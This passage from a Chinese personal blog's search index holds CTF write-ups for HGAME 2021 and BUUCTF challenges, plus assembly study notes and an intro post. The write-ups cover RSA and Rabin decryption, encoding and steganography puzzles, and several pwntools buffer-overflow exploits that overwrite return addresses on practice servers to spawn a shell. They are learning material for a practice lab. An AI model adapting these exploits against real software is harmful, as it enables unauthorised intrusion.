src="https://pic4.zhimg.com/80/v2-6e066085ca916978359bd73744fad5bb_1440w.jpg" alt="img"></p><figure class="highlight plaintext"><figcaption><span>binascii</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs import">import gmpy2<br>n=882564595536224140639625987659416029426239230804614613279163<br>#这里我用yafu分解了n<br>p=857504083339712752489993810777<br>q=1029224947942998075080348647219<br>e=65537<br>c=747831491353896780365654517748216624798517769637260742155527<br>phi=(p-1)*(q-1)<br>d=gmpy2.invert(e,phi)<br>m=pow(c,d,n)<br>print(hex(m))<br>print(binascii.unhexlify(hex(m)[2:].strip(&quot;L&quot;)))<br></code></pre></td></tr></table></figure><p><img src="/rsa1.png"></p><h3 id="gcd-or-more"><a href="#gcd-or-more" class="headerlink" title="gcd or more?"></a>gcd or more?</h3><p>e&#x3D;2，用上一题的脚本显示找不到d，百度到了rabin加密</p><p><code>https://en.wikipedia.org/wiki/Rabin_cryptosystem</code></p><p>然后题目直接给出了p和q，不用手动分解n，就直接套公式解，从四个输出中找可能存在的真正明文</p><p>exp</p><figure class="highlight plaintext"><figcaption><span>binascii</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs import">import gmpy2<br>import libnum<br>p = 85228565021128901853314934583129083441989045225022541298550570449389839609019<br>q = 111614714641364911312915294479850549131835378046002423977989457843071188836271<br>n = p * q<br>#cipher = pow(s2n(FLAG), 2, n)<br>#print(cipher)<br>c=7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539<br>e=2<br><br><br>mp = pow(c, (p + 1) / 4, p)<br>mq = pow(c, (q + 1) / 4, q)<br>yp = gmpy2.invert(p, q)<br>yq = gmpy2.invert(q, p)<br>r = (yp * p * mq + yq * q * mp) % n<br>rr = n - r<br>s = (yp * p * mq - yq * q * mp) % n<br>ss = n - s<br>print libnum.n2s(r)<br>print libnum.n2s(rr)<br>print libnum.n2s(s)<br>print libnum.n2s(ss)<br></code></pre></td></tr></table></figure><p><img src="/gcd1.png"></p><p><code>hgame&#123;3xgcd~is~really~difficult&#125;(狗头）</code></p><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p>#竟是数学题</p><p>c&#x3D;a^p*m（mod p）</p><p>c&#x3D;(a^p%p)*(m%p)%p     </p><p>c&#x3D;(a%p)*(m%p)%p      #费马小定理</p><p>c&#x3D;a*(m%p)%p </p><p>c*a^(p-2)&#x3D;m%p      #费马小定理</p><p>exp</p><figure class="highlight plaintext"><figcaption><span>libnum import *</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs from">a = 143476170144915086020651461328049339656692126954818003650099852868145841319041470073020587125213976925474341076505642227853407676058773113885865826640680023147360447444464935801614525784110903480871654141802517672864060026452463495645509064414259143561988416176609991854421929607534242834743124652491022090289<br>p = 144990456446230144694263694418769858495021475043392279183925650174062004178559844401086360607928511714506442495515664176646230769554023179040226957152981442993492885354384799122222074255748702871095896167656675843624069307328779207379633792655160544271545569917511963865120135589875939937494010889658831130797<br>c = 120094382885627426802043931936833471575878884523974767764562747592243608117847482125722859363444069094268578813034406859087905808108331619918394213908184448430084247326673068817903131008945590119114470183031722078599931222887555377046173518111618239410979061284925061871538324577871419928874075180494037057601<br>p2=p-2<br>am=pow(a,p2,p)<br>cm=c*am<br>m=cm%p<br>print(hex(m))<br>m=n2s(m)<br>print(m)<br></code></pre></td></tr></table></figure><p><img src="/rsa2.png"></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="Telegraph：1601-6639-3459-3134-0892"><a href="#Telegraph：1601-6639-3459-3134-0892" class="headerlink" title="Telegraph：1601 6639 3459 3134 0892"></a>Telegraph：1601 6639 3459 3134 0892</h3><p>这名字很可疑，百度一下，我就知道</p><p><img src="/tel1.png"></p><p>好吧，那咱打开au，显示频谱</p><p><img src="/tel2.png"></p><p>打开滤波器，过滤850Hz</p><p><img src="/tel3.png"></p><p>oh我的上帝，这熟悉的点杠隔</p><p><img src="/tel4.png"></p><p>然后把莫斯电码写下来</p><p>-.–&#x2F;—&#x2F;..-&#x2F;.-.&#x2F;..-.&#x2F;.-..&#x2F;.-&#x2F;–.&#x2F;..&#x2F;…&#x2F;—…&#x2F;….-&#x2F;–.&#x2F;—–&#x2F;—–&#x2F;-..&#x2F;…&#x2F;—–&#x2F;-.&#x2F;–.&#x2F;-…&#x2F;..-&#x2F;-&#x2F;-.&#x2F;—–&#x2F;-&#x2F;….-&#x2F;–.&#x2F;—–&#x2F;—–&#x2F;-..&#x2F;–&#x2F;.-&#x2F;-.&#x2F;—–&#x2F;…–&#x2F;—-.&#x2F;…–&#x2F;.—-&#x2F;—–&#x2F;-.-&#x2F;..</p><p>解密得</p><p><code>yourflagis:4g00ds0ngbutn0t4g00dman039310ki</code></p><p>转化大写包上hgame{}就能交</p><h3 id="Hallucigenia"><a href="#Hallucigenia" class="headerlink" title="Hallucigenia"></a>Hallucigenia</h3><p>放进stegsolve康康有小惊喜</p><p><img src="/mul1.png"></p><p>扫一扫</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC<span class="hljs-regexp">/KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51/</span>KHHT<span class="hljs-regexp">/6/</span>ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5<span class="hljs-regexp">/IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF/</span>LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y<span class="hljs-regexp">//</span><span class="hljs-regexp">/p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk=</span><br></code></pre></td></tr></table></figure><p>b64解出来看见行末有个GNP.根据题目应该是要翻转过来</p><figure class="highlight plaintext"><figcaption><span>60 42 AE 44 4E 45 49  00 00 00 00 FA 3A E0 B1</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs 82">00 01 02 03 04 05 06 07  08 09 0A 0B 0C 0D 0E 0F <br>--------------------------------------------------------------------<br>82 60 42 AE 44 4E 45 49  00 00 00 00 FA 3A E0 B1   | .`B.DNEI.....:..<br>66 A3 6A AD 01 78 2D C8  42 10 84 21 08 42 29 9C   | f.j..x-.B..!.B).<br>35 33 14 F3 4A 53 4A 9E  62 69 8A F5 BD 20 75 4F   | 53..JSJ.bi... uO<br>AD 38 EF 92 4B 88 DE C3  FB 6D 60 04 74 81 D6 09   | .8..K....m`.t...<br>B0 EC 1A C4 64 67 D2 14  24 2F 40 85 F6 45 6E 9A   | ....dg..$/@..En.<br>AB 99 90 6D 23 E6 6F A6  D5 82 FC A0 8F AC BD 20   | ...m#.o........ <br>15 E4 4F 39 C2 36 5B 2A  A3 9D D7 D4 5A 53 63 F9   | ..O9.6[*....ZSc.<br>D8 16 A5 ED 6A 49 31 1C  76 EA D7 CC C4 40 73 91   | ....jI1.v....@s.<br>22 86 C1 1F 96 62 0D F1  1C EE 82 E5 AA EB 52 56   | &quot;....b........RV<br>45 0A 52 23 9D 7F 28 71  D3 FF AF F3 B4 F6 49 DF   | E.R#.(q......I.<br>74 92 29 B8 9E 4D AD 42  E6 4A 0E 35 B2 DC 7F D6   | t.)..M.B.J.5...<br>98 9A C5 61 ED 15 BA A7  74 A9 01 29 D4 49 BD C9   | ...a....t..).I..<br>B9 2B E9 50 12 B1 B1 C6  F2 06 38 8E A4 E4 EA F2   | .+.P......8.....<br>37 1D 46 CC 79 FC 89 DD  5F 0D D5 80 95 7A 88 ED   | 7.F.y..._....z..<br>7E EA 39 78 82 35 69 5A  8B 95 88 EE A2 87 D6 66   | ~.9x.5iZ.......f<br>C9 B4 8F 92 16 AA C8 D5  31 55 7A 55 E5 C6 14 F9   | ........1UzU....<br>7C 79 B1 04 DF 2B 2B 2D  0C B8 A9 9A A6 8C 87 12   | |y...++-........<br>1C 82 FA 65 2E A1 7F 2D  66 73 21 2E 4F BF 06 EA   | ...e..-fs!.O...<br>3A FA D2 94 D1 D5 11 87  21 08 42 10 21 22 02 49   | :.......!.B.!&quot;.I<br>92 62 8F 0B B9 D2 B4 50  1C 3C 94 A5 A1 74 CB FF   | .b.....P.&lt;...t..<br>FF A7 A1 44 0C 20 83 16  CB 96 ED 81 68 54 41 44   | ...D. ......hTAD<br>49 3D 01 00 00 8B 80 B3  AB 00 00 00 02 08 14 00   | I=..............<br>00 00 B4 00 00 00 52 44  48 49 0D 00 00 00 0A 1A   | ......RDHI......<br>0A 0D 47 4E 50 89                                 | ..GNP.<br></code></pre></td></tr></table></figure><p>反转后保存成png文件，是一个长得很别致的flag</p><p><img src="/mul2.png"></p><p>翻转一下就好</p>]]></content>
    
    
    <categories>
      
      <category>ctf-hgame2021</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HGAME2021-week1-writeup</title>
    <link href="/2021/03/02/HGAME2021-week1-writeup-0/"/>
    <url>/2021/03/02/HGAME2021-week1-writeup-0/</url>
    
    <content type="html"><![CDATA[<h1 id="HGAME-2021-Week1-Writeup–6vv"><a href="#HGAME-2021-Week1-Writeup–6vv" class="headerlink" title="HGAME 2021 Week1 Writeup–6vv+"></a>HGAME 2021 Week1 Writeup–6vv+</h1><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="whitegive"><a href="#whitegive" class="headerlink" title="whitegive"></a>whitegive</h3><p>c语言中字符串字面量的值是该字符串的首地址，因此用ida打开二进制文件找到“paSsw0rd”字符串的首地址为0x402012</p><p><img src="/pwn1.png"></p><p><code>nc 182.92.108.71 30009</code></p><p>输入0x402012的十进制即可getshell</p><p><img src="/pwn2.png"></p><p><code>hgame&#123;W3lCOme_t0_Hg4m3_2222Z222zO2l&#125;</code></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h3><p>Base16编码使用16个ASCII可打印字符（数字0-9和字母A-F）对任意字节数据进行编码。</p><p>Base32编码是使用32个可打印字符（字母A-Z和数字2-7）</p><p>Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、&#x2F;）将任意字节序列数据编码成ASCII字符串，另有“&#x3D;”符号用作后缀用途。</p><p><code>R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09</code></p><p>使用base64</p><p><code>GY4DMNZWGE3EINRVG5BDKNZWGUZTCNRTGMYDMRBWGU2UMNZUGMYDKRRUHA2DOMZUGRCDGMZVIYZTEMZQGMZDGMJXIQ======</code></p><p>使用base32</p><p><code>6867616D657B57653163306D655F74305F4847344D335F323032317D</code></p><p>使用base16</p><p><code>hgame&#123;We1c0me_t0_HG4M3_2021&#125;</code></p><h3 id="Galaxy"><a href="#Galaxy" class="headerlink" title="Galaxy"></a>Galaxy</h3><p>拿到一个pcapng文件，放进wireshark里流量分析，因为找的是图片，尝试搜索一下png，找到一个包</p><p><img src="/galaxy1.png"></p><p>追踪TCP流</p><p><img src="/galaxy2.png"></p><p>发现png格式图片信息，把它导出得到图片，ghex修改一下图片的尺寸后发现flag在图片下方</p><p>PNG文件结构分析<a href="https://my.oschina.net/ososchina/blog/801358">https://my.oschina.net/ososchina/blog/801358</a></p><p><img src="/galaxy3.png"></p><p><img src="/galaxy4.png"></p>]]></content>
    
    
    <categories>
      
      <category>ctf-hgame2021</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Buuctf-pwn-writeup</title>
    <link href="/2021/02/10/Buuctf-pwn-writeup-0/"/>
    <url>/2021/02/10/Buuctf-pwn-writeup-0/</url>
    
    <content type="html"><![CDATA[<h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>直接nc就能getshell</p><h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>下载二进制文件，发现有&#x2F;bin&#x2F;sh</p><p><img src="/rip1.png"></p><p>找到后门函数</p><p><img src="/rip3.png"></p><p>很明显的栈溢出，覆盖返回地址为后门函数即可</p><p><img src="/rip2.png"></p><p>exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">sh</span>=remote(&#x27;node3.buuoj.cn&#x27;,26443)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*23+p64(0x401187)<br>sh.send(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>ida打开发现后门函数，直接打开flag.txt，就不用getshell了</p><p><img src="/warmup1.png"></p><p>main函数</p><p><img src="/warmup2.png"></p><p>sprint会打印后门函数的地址，gets函数造成栈溢出</p><p>exp</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">from pwn import *<br><span class="hljs-keyword">sh</span>=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29685</span>)<br><span class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">&#x27;WOW:&#x27;</span>)<br>addr=<span class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">72</span>+p64(<span class="hljs-keyword">int</span>(addr,<span class="hljs-number">16</span>))<br><span class="hljs-keyword">sh</span>.send(payload)<br><span class="hljs-keyword">sh</span>.interactive()<br></code></pre></td></tr></table></figure><h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>ida</p><p><img src="/ciscn1.png"></p><p>gets造成栈溢出</p><p><img src="/ciscn2.png"></p><p>覆盖返回地址exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">sh</span>=remote(&#x27;node3.buuoj.cn&#x27;,27073)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*56+p64(0x4006BE)<br>sh.send(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>覆盖浮点数exp</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-built_in">io</span> = remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span> , <span class="hljs-number">25077</span>)<br>payload = b<span class="hljs-string">&#x27;A&#x27;</span>*(<span class="hljs-number">0x30</span><span class="hljs-number">-0x4</span>) + p64(<span class="hljs-number">0x41348000</span>)   #浮点数转<span class="hljs-number">16</span>进制工具<br><span class="hljs-built_in">io</span>.sendline(payload)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure><h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><p>ida</p><p><img src="/level1.png"></p><p><img src="/level2.png"></p><p>buf长度128，读入0x200可溢出</p><p>exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">sh</span>=remote(&#x27;node3.buuoj.cn&#x27;,26339)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*136+p64(0x400596)<br>sh.send(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>汇编语言--学习笔记</title>
    <link href="/2021/01/14/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/01/14/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><h4 id="reg"><a href="#reg" class="headerlink" title="reg"></a>reg</h4><pre><code class="hljs">    ·AX BX CX DX：可分为H-L(高位-低位)共16位    ·BX      可寻址，默认段地址DS     ·cx：    通常用作loop指令循环次数    ·SI DI： 寄存器(不可分为H-L位，共16位)，可寻址    ·BP      可寻址，默认段地址SS    ·SP        不可用[bx+bp]/[si+di]寻址</code></pre><h4 id="sreg"><a href="#sreg" class="headerlink" title="sreg"></a>sreg</h4><pre><code class="hljs">段寄存器:    ·CS:IP    cpu当前读取指令地址：偏移地址    ·SS:SP    栈顶段地址:偏移地址    ·DS:[..]  访问数据段地址:偏移地址  (DS存放程序内存区段地址，即PSP的段地址SA)    ·ES       段寄存器</code></pre><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><pre><code class="hljs">    zf(6): 相关指令的结果是否(1/0)为零    pf(2)：相关指令执行后的结果所有bit位中1的个数是否(1/0)为偶数    sf(7)：相关指令执行后的结果是否(1/0)为负    cf(0)：记录相关指令的进位值和借位值    of(11)：是否(1/0)发生溢出    df(10)：</code></pre><h4 id="基于flag的条件转移指令"><a href="#基于flag的条件转移指令" class="headerlink" title="基于flag的条件转移指令"></a>基于flag的条件转移指令</h4><pre><code class="hljs">    ·je(equal)      等于则转移      zf=1    ·jne(not equal) 不等于则转移    zf=0    ·jb(below)      低于则转移      cf=1    ·jnb(not below) 不低于则转移    cf=0    ·ja(above)      高于则转移      cf=0且zf=0    ·jna(not above) 不高于则转移    cf=1或zf=1    ·jnc无进位或借位  cf=0</code></pre><h3 id="基本指令"><a href="#基本指令" class="headerlink" title="基本指令"></a>基本指令</h3><pre><code class="hljs">    ·mov/sub ax/al/ah,n/ax    ·add/sub ax,n/ax    ·段间转移           jmp far ptr 标号   修改为标号的段地址与偏移地址           jmp dword ptr 内存单元地址(两个字)  高地址字：段地址  低地址字：偏移地址    ·段内转移           jmp short 标号     八位位移(-128~127)           jmp near ptr 标号  十六位位移(-32768~32767)           jmp word ptr 内存单元地址    ·jcxz：if((cx)==0)jmp short 标号    ·ret:pop ip (近转移)    retf:pop ip;pop cs (远转移)    ·call             call 标号：push ip;jmp near ptr 标号           call far ptr 标号：push cs;push ip;jmp far ptr 标号           call 16位reg：push ip;jmp 16位reg           call word ptr 内存单元地址：push ip;jmp word ptr 内存单元地址           call dword ptr 内存单元地址：push cs;push ip;jmp dword ptr 内存单元地址    ·mul 乘法          mul reg/mul 内存单元          八位乘法：(AL)*reg/内存单元,结果存放在AX中          十六位乘法：(AX)*16位reg/内存单元，结果存放在DX(高)和AX(低)中      ·push/pop    ·inc ax : ax自增    ·dec ax : ax自减    ·loop s:循环s地址中的指令cx次        &#123;       mov cx,idata            s:                循环体                loop s        &#125;    ·and:逻辑与指令    ·or:逻辑或指令    ·ptr:指明数据尺寸 word/byte ptr    ·div:除数            AX(16)/8位数据=AL(商)AH(余)                 DX(高16位)AX(低16位)/16位数据=AX(商)DX(余)    ·dup:   db idata dup (idata、idata、idata)表示重复，与db/dw/dd配合使用    ·offset:取得标号的偏移地址    ·nop:空指令    ·adc：带进位加法指令    ·sbb：带借位减法指令    ·cmp 1,2 比较指令，做减法运算</code></pre><h3 id="Dosbox中Debug的常用指令"><a href="#Dosbox中Debug的常用指令" class="headerlink" title="Dosbox中Debug的常用指令"></a>Dosbox中Debug的常用指令</h3><pre><code class="hljs">    a (Assemble) 逐行汇编 a [address]    c (Compare) 比较两内存块 c range address    d (Dump) 内存16进制显示 d [address]或 d [range]    e (Enter) 修改内存字节 e address [list]    f (fin) 预置一段内存 f range list    g (Go) 执行程序 g [=address][address...]    h (Hexavithmetic) 制算术运算 h value value    i (Input) 从指定端口地址输入 i pataddress    l (Load) 读盘 l [address [driver seetor&gt;    m (Move) 内存块传送 m range address    n (Name) 置文件名　 n filespec [filespec...]    o (Output) 从指定端口地址输出 o portadress byte    p 执行循环、重复的字符串指令、软件中断或子例程。    q (Quit) 结束　 q    r (Register) 显示和修改寄存器 r [register name]    s (Search) 查找字节串　 s range list    t (Trace) 跟踪执行　 t [=address] [value]    u (Unassemble) 反汇编 u [address ]或range    w (Write) 存盘　 w [address[driver sector secnum&gt;</code></pre>]]></content>
    
    
    <categories>
      
      <category>智能学习机器人</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>+Mg的碎碎念</title>
    <link href="/2021/01/01/+Mg%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
    <url>/2021/01/01/+Mg%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="一点感想"><a href="#一点感想" class="headerlink" title="一点感想"></a>一点感想</h2><h3 id="01"><a href="#01" class="headerlink" title="01"></a>01</h3><p>学习过程中的琐碎知识点与方法，时时值得记录，记录下自己的学习轨迹，以求温故知新，不记下来的话，回望来时的路似乎有点空荡</p><h3 id="02"><a href="#02" class="headerlink" title="02"></a>02</h3><p>可能要学很多很多不同领域的知识，大概方便自己区分一下（？）</p><h3 id="03"><a href="#03" class="headerlink" title="03"></a>03</h3><p>会把学到的大大小小的知识点、解决的大大小小的问题、做过的大大小小的题都记下来，大概是个日记本</p><h3 id="04"><a href="#04" class="headerlink" title="04"></a>04</h3><p>blog模板有一些功能还不太会用，接下来会慢慢学习<br>该blog采用模板：fluid搭建，后续会加一些实用（花里胡哨）的功能，比如评论区和音乐播放器和友链（如果有hxd愿意的话）</p><h3 id="05"><a href="#05" class="headerlink" title="05"></a>05</h3><p>用国内网络访问会有亿点点慢，后期可能会换成私人服务器，如果有奇怪的bug存在，pls联系<a href="mailto:&#49;&#55;&#53;&#x36;&#53;&#x36;&#55;&#x38;&#49;&#x34;&#x40;&#113;&#x71;&#46;&#99;&#111;&#109;">&#49;&#55;&#53;&#x36;&#53;&#x36;&#55;&#x38;&#49;&#x34;&#x40;&#113;&#x71;&#46;&#99;&#111;&#109;</a></p><h3 id="06"><a href="#06" class="headerlink" title="06"></a>06</h3><p>关于页有我的github，可能后面会慢慢开始用，但现在是一片荒地（</p><h3 id="07"><a href="#07" class="headerlink" title="07"></a>07</h3><p>还没有决定方向，大概突然想学什么就学什么</p><h3 id="08"><a href="#08" class="headerlink" title="08"></a>08</h3><p>大概是要告诫自己：万丈高楼平地起，勿在浮沙筑高台</p>]]></content>
    
    
    <categories>
      
      <category>随记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>about</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<p>每一个伟大的成就都有一个微不足道的开始</p><p>$  Android学习进行中</p><p>$《操作系统编译与设计-NJU》学习进行中</p><p>$《Engineering a Compiler》阅读进行中</p><p>$《编译原理》阅读进行中</p><p>$《计算机网络自顶向下方法》阅读进行中</p><p>$《程序员的自我修养》阅读已完成</p><p>$《c++ primer plus》阅读已完成</p><p>$《汇编语言–王爽》阅读已完成</p><p>$《c primer plus》阅读已完成</p>]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>categories</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
</search>
